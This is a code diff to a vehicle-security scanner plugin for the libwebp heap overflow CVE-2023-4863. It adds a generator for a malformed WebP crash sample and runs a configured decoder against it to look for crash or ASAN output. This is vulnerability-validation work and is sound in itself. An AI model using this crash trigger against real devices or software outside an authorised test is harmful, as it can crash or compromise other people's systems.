@@ -1,6 +1,11 @@
 #!/usr/bin/env python3
-"""Safe CVE exposure audit PoC for connected-vehicle vulnerability intelligence."""
+"""Active validation PoC for connected-vehicle vulnerability scanning."""
 from __future__ import annotations
+
+import os
+import shlex
+import subprocess
+import tempfile
 
 from active_validation_core import run_active_validation
 from iv_plugin_base import IVIVulnerabilityPlugin
@@ -88,9 +93,57 @@ VULN = {
 }
 
 
+def _write_malformed_webp_sample() -> str:
+    fd, path = tempfile.mkstemp(prefix="autosec_cve_2023_4863_", suffix=".webp")
+    # Minimal RIFF/WEBP container with an oversized VP8L chunk header. This is a
+    # crash-oriented decoder stimulus, not a weaponized RCE payload.
+    payload = (
+        b"RIFF" + (0x120).to_bytes(4, "little") + b"WEBP"
+        b"VP8L" + (0x114).to_bytes(4, "little")
+        + b"\x2f\xff\xff\xff\x0f"
+        + b"A" * 0x100
+    )
+    with os.fdopen(fd, "wb") as handle:
+        handle.write(payload)
+    return path
+
+
+def _webp_decoder_probe(plugin, vuln):
+    supplied_sample = plugin.params.get("webp_sample_path") or plugin.params.get("sample_path")
+    sample = str(supplied_sample) if supplied_sample else _write_malformed_webp_sample()
+    cmd = plugin.params.get("decoder_cmd") or plugin.params.get("webp_decoder_cmd")
+    evidence = {
+        "ok": True,
+        "sample_path": sample,
+        "payload_bytes": os.path.getsize(sample),
+        "sample_source": "operator_supplied" if supplied_sample else "generated_stimulus",
+        "phenomenon": "malformed WebP sample prepared for decoder crash observation",
+        "requires_manual_review": True,
+    }
+    if not cmd:
+        evidence["operator_action"] = "Run a lab decoder/browser against sample_path or pass webp_decoder_cmd/decoder_cmd to observe crash/ASAN output."
+        return evidence
+    started = subprocess.run(
+        shlex.split(str(cmd)) + [sample],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        timeout=float(plugin.params.get("timeout", 10)),
+        check=False,
+    )
+    stderr = started.stderr.decode("utf-8", errors="replace")
+    evidence.update({
+        "command": cmd,
+        "returncode": started.returncode,
+        "stderr_excerpt": stderr[:1000],
+        "vulnerable": started.returncode < 0 or any(token in stderr.lower() for token in ("asan", "heap", "overflow", "segmentation fault", "crash")),
+        "phenomenon": "decoder process executed against malformed WebP sample",
+    })
+    return evidence
+
+
 class Poc64CVE20234863RCEAuditPlugin(IVIVulnerabilityPlugin):
     meta_display_id = 'XLSX-092'
-    meta_poc_name = 'CVE-2023-4863 堆溢出/RCE Exposure Audit'
+    meta_poc_name = 'CVE-2023-4863 堆溢出/RCE Active Validation'
     meta_cve_id = 'CVE-2023-4863'
     meta_severity = 'Critical'
     meta_protocol = 'http'
@@ -106,4 +159,4 @@ class Poc64CVE20234863RCEAuditPlugin(IVIVulnerabilityPlugin):
         return True
 
     def exploit(self):
-        return run_active_validation(self, VULN)
+        return run_active_validation(self, VULN, probe=_webp_decoder_probe)
